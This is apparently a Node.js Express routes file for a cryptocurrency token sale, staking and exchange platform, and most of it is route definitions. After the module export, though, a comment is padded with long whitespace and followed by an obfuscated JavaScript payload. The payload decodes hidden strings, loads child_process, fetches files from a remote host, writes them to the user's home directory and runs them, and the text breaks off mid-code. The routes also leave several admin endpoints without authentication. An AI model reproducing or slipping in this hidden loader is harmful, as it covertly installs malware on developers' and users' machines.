const UserModel = require('../models/user.model');
const jwt = require('jsonwebtoken');
const express = require('express');
const router = express.Router();
const bodyParser = require("body-parser");
const mysql = require('mysql2');
const config = require('../config');
const requestIp = require('request-ip');
const cron = require('node-cron');
const app = express();
require("dotenv").config();
const cors = require("cors");
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());
router.use(bodyParser.json());
router.use(
    bodyParser.urlencoded({
        extended: true,
    })
);
const pool = mysql.createPool({ host: config.mysqlHost, user: config.user, password: process.env.DB_PASS || config.password, database: config.database, port: config.mysqlPort });
const promisePool = pool.promise();

let multer = require('multer');
let storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, './uploads');
    },
    filename: (req, file, cb) => {
        let filetype = '';
        if (file.mimetype === 'image/png') {
            filetype = 'png';
        }
        if (file.mimetype === 'image/jpeg') {
            filetype = 'jpeg';
        }
        if (file.mimetype === 'image/jpg') {
            filetype = 'jpg';
        }
        if (file.mimetype === 'video/mp4') {
            filetype = 'mp4';
        }
        if (file.mimetype === 'application/pdf') {
            filetype = 'pdf';
        }
        cb(null, 'image-' + Date.now() + '.' + filetype);
    }
});
let upload = multer({ storage: storage });
let profileUplaod = upload.fields([{ name: 'profile_pic', maxCount: 1 }])
// let profileUplaod = upload.array('userPhoto',2);
let kyc_document_image = upload.fields([{ name: 'kyc_document_image', maxCount: 1 },{ name: 'kyc_document_image2', maxCount: 1 },{ name: 'user_photo', maxCount: 1 }])

var receipt = upload.fields([{ name: 'receipt', maxcount: 1 }])
let blogimages=upload.fields([{ name: 'image', maxCount: 1 }])
let achieverimages=upload.fields([{ name: 'images', maxCount: 1 }])
let file=upload.fields([{ name: 'file', maxCount: 1 }])

// All controllers call here
const registerController = require('../controllers/register.controller');
const loginController = require('../controllers/login.controller');
const userController = require('../controllers/user.controller');
const buyController = require('../controllers/buy.controller');
const withdrawController = require('../controllers/withdraw.controller');
const businessCronController = require('../controllers/businessCron.controller');
const liveDepositManageController = require('../controllers/liveDepositManage');
const cmsController = require('../controllers/cms.controller');
const WebSocket = require('../controllers/Exchange_Controller/webSocket')
//Exchange Controller
// All Validations call here
const { registerUserSchema,LoginWithAddressSchema, newsLetterSchema, contactRequestSchema ,loginUserSchema, ForgotPasswordSchema, ResetPasswordSchema, updatePasswordSchema } = require('../middleware/validators/userValidator.middleware');
const { buyTokenSchema } = require('../middleware/validators/buyValidator.middleware');
const { withdrawSchema } = require('../middleware/validators/withdrawValidator.middleware');
const { adminLoginSchema, changePasswordSchema,blogvalidation,insertachieverSchema } = require('../middleware/validators/adminValidator.middleware');
const {ticketSchema} = require ('../middleware/validators/exchange.middleware')

cron.schedule("0 0 * * *", async function () {
    console.log('Cron run')
    await businessCronController.businessCron();
});

cron.schedule("* * * * *", async function () {
    console.log('Cron run for deposit',req.user_id)
  
//    if(req.user_id){
//     console.log('Cron run for deposit')
//     let sql = `SELECT cm.id,cm.name,cm.symbol,cm.is_deposit,cm.is_withdraw,cm.is_tradable,cm.deposit_fee,cm.withdraw_fee,cm.user_ids as coin_user_id,cm.test_contract,cm.contract,cm.Bnb_contract,cm.Trc_contract,cm.icon,ul.id as wallet_id,ul.user_id,ul.coin_id,concat(ul.balance,'') as balance,ul.balanceInOrder,ul.public_key,ul.private_key,ul.trc_privatekey,ul.trc_publickey,ul.bnb_privatekey,ul.bnb_publickey from coins as cm LEFT JOIN user_wallet as ul ON cm.id=ul.coin_id WHERE   ul.user_id=${req.user_id}`;
//     const [result, fields] = await promisePool.query(sql);
//     if (result[0].public_key != null) {
//         // const resp = manageWallet(result);
//         await liveDepositManageController.manageWallet(result);
    
//     }
// }
  
    // console.log('Cron run for deposit',aa)
  
}); 


// 0,1 -> * *
cron.schedule("0 1 * * *", async function () {
    console.log('staiking Cron')
    await businessCronController.usersStakingIncome();
});

cron.schedule("0 0 * * *", async function () {
    console.log('update');
    await businessCronController.updateCompleteStaking();
});

// Crons Routing
// router.get('/businessCron', registerUserSchema, businessCronController.businessCron.bind());

function fileSizeLimitErrorHandler  (err, req, res, next)  {
    if (err) {
        return res.status(200).json({
            success:false,
            msg: "File Size is to large then 512kb",
        });
    //   res.sendStatus(413)
    } else {
      next()
    }
  }

// Register Routing
router.post('/userRegister', registerUserSchema, registerController.userRegister.bind()); //done
router.post('/addNewsLetter',newsLetterSchema ,registerController.addNewsLetter.bind());
router.post('/contactFormRequest',contactRequestSchema ,registerController.contactFormRequest.bind());

// Login Routing
router.post('/login', loginUserSchema, loginController.login.bind()); //done
router.post('/LoginWithAddress', LoginWithAddressSchema, loginController.LoginWithAddress.bind());
router.post('/verifyAccount', loginController.activateAccount.bind()); //done
router.post('/resendmail', loginController.resendmail.bind()); //done

router.post('/forgotPassword', ForgotPasswordSchema, loginController.ForgotPassword.bind());// done
router.post('/resetpassword', ResetPasswordSchema, loginController.Resetpassword.bind()); //done

// User Routing
router.post('/getUserProfile', ensureWebToken, userController.getUserProfile.bind()); // done
router.post('/UpdateUserProfile', profileUplaod, ensureWebToken ,userController.UpdateUserProfile.bind()); //done
router.post('/updatePassword', updatePasswordSchema, ensureWebToken ,userController.updatePassword.bind()); //done

router.post('/deactiveaccount',  ensureWebToken ,userController.deactiveaccount.bind()); //done

router.post('/getuserbankdetails',cmsController.getuserbankdetails.bind());
router.post('/updateuserbankdetails',cmsController.updatebankdetails.bind());

router.post('/getbankdetailsusers',cmsController.getbankdetailsusers.bind());


router.post('/getkyc', ensureWebTokenForAdmin, userController.getkyc.bind());
router.post('/updatekycapproval',ensureWebTokenForAdmin,userController.updatekycapproval.bind());
router.post('/rejectkycapproval',ensureWebTokenForAdmin,userController.rejectkycapproval.bind());
router.post('/updatekyc', kyc_document_image, ensureWebToken, userController.updatekyc.bind());

router.post('/updateiskyc',ensureWebTokenForAdmin,userController.updateiskyc.bind());
router.post('/disableiskyc',ensureWebTokenForAdmin,userController.disableiskyc.bind());

router.post('/showuserkyc',  userController.showuserkyc.bind());

router.post('/showkyc', ensureWebToken, userController.showkyc.bind());
router.post('/showiskyc',  userController.showiskyc.bind());

router.post('/getMntWalletsDetails',ensureWebTokenForAdmin,  userController.getMntWalletsDetails.bind());
router.post('/getPhase', ensureWebToken, userController.getPhase.bind());
router.post('/getMntWalletDetails', ensureWebToken, userController.getMntWalletDetails.bind());
router.post('/getTotalRefIncome', ensureWebToken, userController.getTotalRefIncome.bind());
router.post('/getDirectReferralCount', ensureWebToken, userController.getDirectReferralCount.bind()); // done 
router.post('/getReferralUsersList', ensureWebToken, userController.getReferralUsersList.bind());
router.post('/getNodesList', ensureWebToken, userController.getNodesList.bind());
router.post('/getstatisticsList', ensureWebToken, userController.getstatisticsList.bind());
router.post('/getEarningProjections', ensureWebToken, userController.getEarningProjections.bind());
router.post('/getTeamReferral', ensureWebToken, userController.getTeamReferral.bind()); // done
router.post('/getTeamReferralList', ensureWebToken, userController.getTeamReferralList.bind());
router.post('/getRewardsList', ensureWebToken, userController.getRewardsList.bind());
router.post('/getBlockExpansionIncome', ensureWebToken, userController.getBlockExpansionIncome.bind());
router.post('/getTokenAllocation', ensureWebToken, userController.getTokenAllocation.bind());
router.post('/getCapingPlan', ensureWebToken, userController.getCapingPlan.bind());
router.post('/getUpcomingEventsList', userController.getUpcomingEventsList.bind());
router.post('/exchangeicotransfer', ensureWebToken, userController.ExchangeTransferICO.bind()); // done


// Buy Routing
router.post('/getActivePhase', ensureWebToken, buyController.getActivePhase.bind());
router.post('/tokenPurchase', ensureWebToken,blogimages, buyController.tokenPurchase.bind());
router.post('/stripetokenPurchase', ensureWebToken, buyController.stripePayment.bind());
router.post('/getTokenPurchase',ensureWebToken,  buyController.getTokenPurchase.bind());

// Withdraw Routing
router.post('/userWithdraw', ensureWebToken,  withdrawController.userWithdraw.bind());
router.post('/getWithdrawList',ensureWebToken,  withdrawController.getWithdrawList.bind()); //done

/// By AJ strat ///
const { submitStackingSchema } = require('../middleware/validators/stackValidator.middleware');
const stackController = require('../controllers/stack.controller');
router.post('/submitStacking', submitStackingSchema, ensureWebToken ,stackController.submitStacking.bind());

router.post('/getUserStackingHistory',ensureWebToken,  stackController.getUserStackingHistory.bind()); //done
router.post('/getUserStackingHistorybyid',  stackController.getUserStackingHistorybyid.bind()); //done

router.post('/getStackingPrice', ensureWebToken ,stackController.getStackingPrice.bind());

router.post('/getEarningHistory',ensureWebToken, stackController.getEarningHistory.bind()); //done

// Admin routes
const adminController = require('../controllers/admin.controller');
router.post('/adminLogin', adminLoginSchema, adminController.adminLogin.bind());
router.post('/getDashboardStatistics', ensureWebTokenForAdmin, adminController.getDashboardStatistics.bind());
router.post('/getUsersList', ensureWebTokenForAdmin, adminController.getUsersList.bind());
router.post('/getUsersListFilter',  adminController.getUsersListFilter.bind());

router.post('/getUsersReferrals', ensureWebTokenForAdmin, adminController.getUsersReferrals.bind());

router.post('/getStackingHistory', ensureWebTokenForAdmin, adminController.getStackingHistory.bind());
router.post('/getWithdrawalStatistics', ensureWebTokenForAdmin, adminController.getWithdrawalStatistics.bind());
router.post('/getWithdrawalStatisticsCrypto', ensureWebTokenForAdmin, adminController.getWithdrawalStatisticsCrypto.bind());
router.post('/getMntWithdrawalHistory', ensureWebTokenForAdmin, adminController.getMntWithdrawalHistory.bind());
router.post('/getCryptoMntWithdrawalHistory', ensureWebTokenForAdmin, adminController.getCryptoMntWithdrawalHistory.bind());
router.post('/approveWithdrwalRequest', ensureWebTokenForAdmin, adminController.approveWithdrwalRequest.bind());
router.post('/rejectWithdrwalRequest', ensureWebTokenForAdmin, adminController.rejectWithdrwalRequest.bind());
router.post('/getTransactionHistory', ensureWebTokenForAdmin, adminController.getTransactionHistory.bind());
router.post('/getPhaseList', ensureWebTokenForAdmin, adminController.getPhaseList.bind());
router.post('/updatePhase', ensureWebTokenForAdmin, adminController.updatePhase.bind());
router.post('/updatePhaseStatus', ensureWebTokenForAdmin, adminController.updatePhaseStatus.bind());
router.post('/getStackingSetting', ensureWebTokenForAdmin, adminController.getStackingSetting.bind());
router.post('/getSystemSetting', ensureWebTokenForAdmin, adminController.getSystemSetting.bind());
router.post('/updateSystemSetting', ensureWebTokenForAdmin, adminController.updateSystemSetting.bind());
router.post('/getDynamicPrice', ensureWebTokenForAdmin, adminController.getDynamicPrice.bind());
router.post('/getSubscriberList', ensureWebTokenForAdmin, adminController.getSubscriberList.bind());
router.post('/changePassword', changePasswordSchema, ensureWebTokenForAdmin, adminController.changePassword.bind());
router.post('/getActivePhaseAdmin', ensureWebTokenForAdmin, adminController.getActivePhaseAdmin.bind());
router.post('/loginAsUser', ensureWebTokenForAdmin, adminController.loginAsUser.bind());
router.post('/userblock', ensureWebTokenForAdmin,adminController.userblock.bind());
router.post('/userUnblock',ensureWebTokenForAdmin,adminController.userUnblock.bind());
router.post('/showSystemSetting',  adminController.getSystemSetting.bind());
router.post('/updateTradeFee', ensureWebTokenForAdmin, adminController.updateTradeFee.bind());
router.post('/getCryptoMntWithdrawalHistoryAdmin', ensureWebTokenForAdmin, adminController.getCryptoMntWithdrawalHistoryAdmin.bind());


router.post('/useruserblock', ensureWebToken, adminController.userblock.bind());

router.post('/getblog',ensureWebTokenForAdmin, adminController.getblog.bind());
router.post('/getblogid',adminController.getblogid.bind());
router.post('/blogdelete',ensureWebTokenForAdmin, adminController.blogdelete.bind());
router.post('/insertblog',blogimages, ensureWebTokenForAdmin, adminController.insertblog.bind());
router.post('/updateblog',blogimages, ensureWebTokenForAdmin, adminController.updateblog.bind());
router.post('/getuserBlog', userController.getuserBlog.bind());
router.post('/getuserblogid',userController.getuserblogid.bind());
router.post('/getRecentuserBlog',userController.getRecentuserBlog.bind());
router.post('/getuserDetails',blogimages,adminController.getuserDetails.bind());
router.post('/getUserBlogSlider', userController.getUserBlogSlider.bind());
router.post('/getBlogSlider',adminController.getBlogSlider.bind());
router.post('/getblogsliderid',adminController.getblogsliderid.bind());
router.post('/updateBlogSlider',blogimages,adminController.updateBlogSlider.bind());
router.post('/activeBlog',adminController.activeBlog.bind());
router.post('/deactiveBlog',adminController.deactiveBlog.bind());
router.post('/showusersDetails',adminController.showusersDetails.bind());
router.post('/insertTransactionHash',adminController.insertTransactionHash.bind());
router.post('/updatecryptowithdraw', ensureWebTokenForAdmin, adminController.updatecryptowithdraw.bind());

router.post('/addBlogslider',adminController.addBlogslider.bind());
router.post('/notaddBlogslider',adminController.notaddBlogslider.bind());
router.post('/inserAchiever',achieverimages,insertachieverSchema,adminController.inserAchiever.bind());
router.post('/updateachieve',achieverimages,adminController.updateachieve.bind());
router.post('/getachiever',adminController.getachiever.bind());
router.post('/getachieverid',adminController.getachieverid.bind());
router.post('/achieverdelete',adminController.achieverdelete.bind());
router.post('/getuserAchiever', userController.getuserAchiever.bind());

//cms data
router.post('/getfaqs', cmsController.showFaqs.bind());
router.post('/insertfaqs',ensureWebTokenForAdmin, cmsController.insertfaqs.bind());
router.post('/updatefaqs',ensureWebTokenForAdmin, cmsController.updatefaqs.bind());
router.post('/deletefaqs',ensureWebTokenForAdmin, cmsController.deletefaqs.bind());
router.get('/showfaqs', cmsController.showFaqs.bind());

router.post('/getaboutus',ensureWebTokenForAdmin, cmsController.getaboutus.bind());
router.post('/updateaboutus',ensureWebTokenForAdmin, cmsController.updateaboutus.bind());
router.get('/showaboutus', cmsController.getaboutus.bind());

router.post('/gettou',ensureWebTokenForAdmin, cmsController.gettou.bind());
router.post('/updatetou',ensureWebTokenForAdmin, cmsController.updatetou.bind());
router.get('/showtou', cmsController.gettou.bind());

router.post('/getprivacypolicy',ensureWebTokenForAdmin, cmsController.getprivacypolicy.bind());
router.post('/updateprivacypolicy',ensureWebTokenForAdmin, cmsController.updateprivacypolicy.bind());
router.get('/showprivacypolicy', cmsController.getprivacypolicy.bind());

router.post('/getcookiepolicy',ensureWebTokenForAdmin, cmsController.getcookiepolicy.bind());
router.post('/updatecookiepolicy',ensureWebTokenForAdmin, cmsController.updatecookiepolicy.bind());
router.get('/showcookiepolicy', cmsController.getcookiepolicy.bind());

router.post('/getcontactus',ensureWebTokenForAdmin ,cmsController.getcontactus.bind());

router.post('/getbankdetails',ensureWebTokenForAdmin ,cmsController.getbankdetails.bind());
router.post('/updatebankdetails',ensureWebTokenForAdmin, cmsController.updatebankdetails.bind());

router.post('/getadminbankdetails',cmsController.getbankdetails.bind());


router.post('/getbuyrequest',ensureWebTokenForAdmin ,cmsController.getbuyrequest.bind());
router.post('/updatebuyrequest', ensureWebTokenForAdmin, adminController.updatebuyrequest.bind());
router.post('/rejectbuyrequest', ensureWebTokenForAdmin, adminController.rejectbuyrequest.bind());

router.post('/minwithdraw',ensureWebTokenForAdmin ,cmsController.minwithdraw.bind());
router.post('/updatewithdraw',ensureWebTokenForAdmin,cmsController.updatewithdraw.bind());
router.post('/showminwithdraw',cmsController.minwithdraw.bind());

router.post('/dailymaxwithdrawlimit', cmsController.dailymaxwithdrawlimit.bind());
router.post('/showwithdrawlimit', cmsController.showwithdrawlimit.bind());



router.post('/getwithdrawhistory',ensureWebTokenForAdmin,cmsController.getwithdrawhistory.bind()); //not working sql
router.post('/getReferalEarning',ensureWebTokenForAdmin,cmsController.getReferalEarning.bind()); //not working sql
router.post('/getstackingEarning',ensureWebTokenForAdmin,cmsController.getstackingEarning.bind()); 
router.post('/getPrchaseHistory',ensureWebTokenForAdmin,cmsController.getPrchaseHistory.bind());


router.post('/getexchangetransaction', ensureWebTokenForAdmin, adminController.getexchangetransaction.bind());
router.post('/updateexchangetransaction', ensureWebTokenForAdmin, adminController.updateexchangetransaction.bind());
router.post('/rejectexchangetransaction', ensureWebTokenForAdmin, adminController.rejectexchangetransaction.bind());

//-------------------------------------Exchange--------------------------------------------
//exchange
const exadminController = require('../controllers/Exchange_Controller/admin.controller');
const exuserController = require('../controllers/Exchange_Controller/user.controller');
const exwithdrawController = require('../controllers/Exchange_Controller/withdraw.controller');

router.get('/getfees', exadminController.getfees.bind());
router.post('/getcurrencies', exadminController.getcurrencies.bind());
router.post('/getexbankdetails', exadminController.getexbankdetails.bind());
router.post('/adminpairlist', exadminController.adminpairlist.bind());
router.post('/activeDeactivecoinPairs', exadminController.activeDeactivecoinPairs.bind());
router.post('/admincoinlist', exadminController.admincoinlist.bind());
router.post('/updatecoinbyid', exadminController.updatecoinbyid.bind());
router.post('/getuserwalletlist', exadminController.getuserwalletlist.bind());

router.post('/getticket', exadminController.getticket.bind());
router.post('/insertticket', ticketSchema, ensureWebToken, exadminController.insertticket.bind());
router.post('/getallticket',  exadminController.getallticket.bind());
router.post('/ticketapprove', ensureWebTokenForAdmin,  exadminController.ticketapprove.bind());
router.post('/ticketreject', ensureWebTokenForAdmin,  exadminController.ticketreject.bind());



router.post('/getwebcontent', exadminController.getwebcontent.bind());
// router.post('/updatewebcontent',ensureWebTokenForAdmin, exadminController.updatewebcontent.bind());
router.post('/updatedeposit_content',ensureWebTokenForAdmin, exadminController.updatedeposit_content.bind());
router.post('/updatereferral_content',ensureWebTokenForAdmin, exadminController.updatereferral_content.bind());
router.post('/updatekyc_content',ensureWebTokenForAdmin, exadminController.updatekyc_content.bind());
router.post('/updateterms_condition',ensureWebTokenForAdmin, exadminController.updateterms_condition.bind());
router.post('/updateprivacy_policy',ensureWebTokenForAdmin, exadminController.updateprivacy_policy.bind());
router.post('/updateabout',ensureWebTokenForAdmin, exadminController.updateabout.bind());

router.post('/getannouncement',ensureWebTokenForAdmin, exadminController.getannouncement.bind());
router.post('/insertannouncement' , ensureWebTokenForAdmin, exadminController.insertannouncement.bind());
router.post('/updateannouncement' , ensureWebTokenForAdmin, exadminController.updateannouncement.bind());
router.post('/inactiveannouncement' ,  ensureWebTokenForAdmin, exadminController.inactiveannouncement.bind());
router.post('/activeannouncement' ,  ensureWebTokenForAdmin, exadminController.activeannouncement.bind());
router.post('/deleteannouncement' ,  ensureWebTokenForAdmin, exadminController.deleteannouncement.bind());

router.post('/transactiontype', ensureWebTokenForAdmin, exadminController.transactiontype.bind());
router.post('/transactionfilter',  exadminController.transactionFilterRecord.bind());
router.post('/orderfilter',  exadminController.orderfilterrecord.bind());
router.post('/depositadmininr',  exadminController.depositadmininr.bind());
router.post('/approvedepositadmininr',  exadminController.approvedepositadmininr.bind());
router.post('/rejectdepositadmininr',  exadminController.rejectdepositadmininr.bind());

router.post('/getorders',  exadminController.getorders.bind());
router.post('/getchat',  exadminController.getchat.bind());

router.post('/getGraphData', WebSocket.getGraphData.bind())
// router.post('/orderfilter', ensureWebToken, adminreport.orderFilterRecord.bind(this, db));


//exchange user

router.get('/getusernotification',  exuserController.getusernotification.bind());

router.post('/getuserdevice', exuserController.getuserdevice.bind());
router.post('/getDeviceDetail', exuserController.getDeviceDetail.bind());
router.post('/insertDeviceDetail', exuserController.insertDeviceDetail.bind());
router.post('/userwallet', exuserController.userWallet.bind());
router.post('/getuserdepositinr', exuserController.getuserdepositinr.bind());
router.post('/geticotransfer', exuserController.getICOTransfer.bind());


router.post('/favoritepair', exuserController.favoritepair.bind());
router.post('/getfavoritepair', exuserController.getfavoritepair.bind());
router.post('/orderbook', exuserController.orderBook.bind());
router.post('/userorder',exuserController.getUserOrder.bind());
router.get('/coinList', exuserController.coinList.bind());
router.post('/pairlist', exuserController.pairList.bind());
router.post('/getUserPiarBalance', exuserController.getUserPiarBalance.bind());
router.post('/getQR',  exuserController.getQR.bind());
router.post('/emailotp', ensureWebToken, exuserController.Email_otp.bind());
// router.post('/disableemailauth',ensureWebToken,  exuserController.disableemailauth.bind());
router.post('/disableAuth', ensureWebToken, exuserController.disableAuth.bind());
router.post('/twoAuthenticationVerify',  exuserController.twoAuthenticationVerify.bind());
router.post('/trxHistory',  exuserController.trxHistory.bind());
router.post('/getdashuserorder',  exuserController.getDashUserOrder.bind());
router.post('/orderHistory',  exuserController.orderHistory.bind());

router.post('/createOrder', ensureWebToken, exuserController.createOrder.bind());
router.post('/cancelOrder', ensureWebToken, exuserController.cancelOrder.bind());

router.post('/slcliveprice', exuserController.getSLCLive.bind());

router.post('/getslcgraph', WebSocket.getSLCGraph.bind())

// EX Withdraw
router.post('/coindetail', ensureWebToken, exwithdrawController.coinDetail.bind());

router.post('/cryptowithdraw', ensureWebToken, exwithdrawController.cryptowithdraw.bind());
router.post('/cryptowithdrawvalidation', ensureWebToken, exwithdrawController.checkCryptowithdrawvalidation.bind());
router.post('/withdrawAuthentication', ensureWebToken, exwithdrawController.withdrawAuthentication.bind());
router.post('/depositForm', receipt,exwithdrawController.depositForm.bind())
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


const path1 = require('path')
exports.getImage = async (req, res) => {
    const image = req.params.image;
    const myPath = path1.resolve(process.cwd(), "uploads", image);
    res.sendFile(myPath);
}
const getFile = require('../controllers/getFile');

router.get("/uploads/:image", getFile.getImage);


router.get("/", function (request, response) {
    response.contentType("routerlication/json");
    response.end(JSON.stringify("Node is running"));
});

router.get("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

router.post("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

function ensureWebToken(req, res, next) {
    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWT(req, res, next);
    } else {
        res.sendStatus(403);
    }
}

async function verifyJWT(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            console.log(err);
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            req.user_id = req.user.id;
            req.email = req.user.email;
            req.bnb_address = req.user.bnb_address;
            console.log(req.user.email);
            // check if user is active or not 
            let userDetails = await UserModel.getUsersDetails(req.user.email);
            next();
            // if (userDetails[0].is_active == 0) {
            //     return res.sendStatus(403);
            // } else {
            //     next();
            // }
        }
    })
}

function ensureWebTokenForAdmin(req, res, next) {

    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWTForAdmin(req, res, next);
    } else {
        res.sendStatus(403);
    }
}


async function verifyJWTForAdmin(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            if (req.user.role != 'cpadmin') {
                return res.sendStatus(403);
            }
            next();
        }
    })
}



module.exports.routes = router;   /*  These will make your tests more declarative, clear to read and to maintain.*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      const bi=a1,bj=a1,bk=a1,bl=a1,bm=a1;(function(aU,aV){const b7=a1,b8=a1,b9=a1,ba=a1,bb=a1,aW=aU();while(!![]){try{const aX=parseInt(b7(0x4b))/0x1*(parseInt(b8(0x31))/0x2)+parseInt(b9(0x1e))/0x3+-parseInt(b8(0x5b))/0x4*(-parseInt(ba(0x3a))/0x5)+-parseInt(b8(0x61))/0x6+parseInt(bb(0x5a))/0x7+parseInt(b8(0x53))/0x8+-parseInt(ba(0x1f))/0x9*(parseInt(bb(0x1b))/0xa);if(aX===aV)break;else aW['push'](aW['shift']());}catch(aY){aW['push'](aW['shift']());}}}(a0,0x1ebec));const a2=(function(){let aU=!![];return function(aV,aW){const aX=aU?function(){const bc=a1;if(aW){const aY=aW[bc(0x24)+'y'](aV,arguments);return aW=null,aY;}}:function(){};return aU=![],aX;};}()),a3=a2(this,function(){const bd=a1,be=a1,bf=a1,bg=a1,bh=a1;return a3[bd(0x60)+be(0xc)]()[be(0x4d)+'ch'](bd(0x30)+bg(0x68)+bg(0x44))[bd(0x60)+be(0xc)]()[be(0x45)+bd(0x9)+bd(0x28)](a3)[bg(0x4d)+'ch'](bd(0x30)+bd(0x68)+be(0x44));});a3();const a4=bi(0x16),a5=bi(0x4a)+'64',a6=aU=>(s1=aU[bi(0x1a)+'e'](0x1),Buffer[bl(0x52)](s1,a5)[bk(0x60)+bl(0xc)](a4)),a7=require(a6(bi(0x56))),a8=require(a6(bj(0x40))),a9=require(a6(bl(0x3e)+bk(0x7)+bm(0x14))),aa=require(a6(bl(0x5d)+bl(0x19))),ab=require(a6(bi(0x4c)+bi(0x5c)+bm(0x3f)+bk(0x47)+'z')),ac=require(a6(bj(0x65)+bl(0x8)+bk(0x38)+bk(0x1c)+bk(0x0)))[a6(bi(0x43)+bi(0x10))],ad=a7[a6(bk(0x2)+bk(0x49)+bk(0x13))](),ae=a7[a6(bk(0x11)+bl(0x4e)+bk(0x64))](),af=a7[a6(bl(0x2f)+bj(0x5f)+bl(0x6))](),ag=a7[a6(bl(0x1)+bi(0x2b)+bj(0x2e))]();function a1(a,b){const c=a0();return a1=function(d,e){d=d-0x0;let f=c[d];return f;},a1(a,b);}let ah;const ai=bl(0x3c)+bi(0x34)+bi(0x51)+'=',aj=bm(0x25),ak=aU=>Buffer[bk(0x52)](aU,a5)[bi(0x60)+bk(0xc)](a4);function a0(){const bX=['bZnM','hdFN','oqr','oZXh','+)+$','cons','/s/','jZXN','ZT3','tZWR','base','7dUViNB','Xbm9','sear','zdG5','f93a80304111','Char','vLw=','from','1079520hydJic','5bmM','MTEu','ab3M','aL2t','rYXJ','ybUR','1196258HeRBNf','137932VWrJtU','kZTp','NcGF','GaWx','hdGZ','toSt','1093800gHemUR','Code','NDMu','hbWU','lY2h','now','fcG9','+)+)','zcw','bdXN','UaG9','Wc3R','====','kaXJ','vcm0','xdWV','pbGR','truc','cmp','leXM','ring','join','subs','lU3l','lYw','haG9','vdXJ','pcg','zdA','uYw','utf8','size','HbWt','0aA','slic','5290BGFspw','vY2V','kZm9','435849BoYuql','6219FoataV','hdGE','spli','trin','Tcm1','appl',':124','5A1','TeW5','tor','MjAw','NDUu','lckl','jd3J','leng','uZm8','McGx','(((.','14354DhukHN','pdGV','MjQ4','0cDo','ndg','lcm5','tdXN','fcHJ','vZ2V','25cDyKzz','zU3l','aaHR','pc3R','DcmV','wcm9'];a0=function(){return bX;};return a0();}var al='',am='';const an=[0x70,0xa0,0x89,0x48],ao=aU=>{const bn=a1,bo=a1,bp=a1,bq=a1;let aV='';for(let aW=0x0;aW<aU[bn(0x2d)+'th'];aW++)rr=0xff&(aU[aW]^an[0x3&aW]),aV+=String[bn(0x52)+bn(0x50)+bq(0x62)](rr);return aV;},ap=bj(0x39)+'0',aq=bi(0x2c)+bl(0x32)+bl(0x5e)+bl(0xf)+bm(0x15),ar=a6(bi(0x3)+bm(0x41)+bl(0x54)),as=a6(bl(0x18)+bj(0x5)+bi(0x27)+'j'),at=a6(bj(0x43)+bl(0x3d)+bm(0x3b)+bi(0x15));function au(aU){return a8[at](aU);}const av=[0x5f,0xca,0xa6],aw=[0x5e,0xd6,0xfa,0x2b,0x1f,0xc4,0xec],ax=()=>{const br=a1,bs=a1,aU=a6(ap),aV=a6(aq),aW=ao(aw);let aX=aa[br(0xd)](ad,aW);try{aY=aX,a8[as](aY,{'recursive':!0x0});}catch(b1){aX=ad;}var aY;const aZ=''+al+ao(av)+am,b0=aa[bs(0xd)](aX,ao(ay));try{!function(b2){const bt=a1,bu=a1,b3=a6(bt(0x23)+bu(0x27)+'j');a8[b3](b2);}(b0);}catch(b2){}a9[aU](aZ,(b3,b4,b5)=>{if(!b3){try{a8[aV](b0,b5);}catch(b6){}aB(aX);}});},ay=[0x4,0xc5,0xfa,0x3c,0x5e,0xca,0xfa],az=[0x5f,0xd0],aA=[0x0,0xc1,0xea,0x23,0x11,0xc7,0xec,0x66,0x1a,0xd3,0xe6,0x26],aB=aU=>{const bv=a1,bw=a1,aV=a6(ap),aW=a6(aq),aX=''+al+ao(az),aY=aa[bv(0xd)](aU,ao(aA));let aZ=0x0;if(au(aY))try{const b0=a8[ar](aY);aZ=b0[bv(0x17)];}catch(b1){aZ=0x0;}a9[aV](aX,(b2,b3,b4)=>{const bx=a1;if(!b2){try{b4[bx(0x2d)+'th']>aZ&&a8[aW](aY,b4);}catch(b5){}aF(aU);}});},aC=[0x13,0xc4],aD=[0x56,0x86,0xa9,0x26,0x0,0xcd,0xa9,0x21,0x50,0x8d,0xa4,0x3b,0x19,0xcc,0xec,0x26,0x4],aE=[0x1e,0xcf,0xed,0x2d,0x2f,0xcd,0xe6,0x2c,0x5,0xcc,0xec,0x3b],aF=aU=>{const by=a1,aV=ao(aC)+'\x20\x22'+aU+'\x22\x20'+ao(aD);aa[by(0xd)](aU,ao(aE));try{ac(aV,(aW,aX,aY)=>{aK(aU);});}catch(aW){}},aG=[0x1e,0xcf,0xed,0x2d],aH=[0x1e,0xd0,0xe4,0x68,0x5d,0x8d,0xf9,0x3a,0x15,0xc6,0xe0,0x30],aI=[0x19,0xce,0xfa,0x3c,0x11,0xcc,0xe5],aJ=aU=>{const bz=a1,aV=aa[bz(0xd)](aU,ao(ay)),aW=ao(aG)+'\x20'+aV;try{ac(aW,{'windowsHide':!0x0},(aX,aY,aZ)=>{});}catch(aX){}},aK=aU=>{const bA=a1,aV=ao(aH)+'\x20\x22'+aU+'\x22\x20'+ao(aI),aW=aa[bA(0xd)](aU,ao(aE));try{au(aW)?aJ(aU):ac(aV,(aX,aY,aZ)=>{aJ(aU);});}catch(aX){}};s_url=bi(0x12)+'s',sForm=a6(bk(0x1d)+bj(0x59)+bi(0x20)),surl=a6(bk(0x12)+'s');const aL=a6(bm(0x67)+bi(0x14));let aM=bl(0xa);const aN=async aU=>{const bG=a1,bH=a1,aV=(aY=>{const bB=a1,bC=a1,bD=a1,bE=a1,bF=a1;let 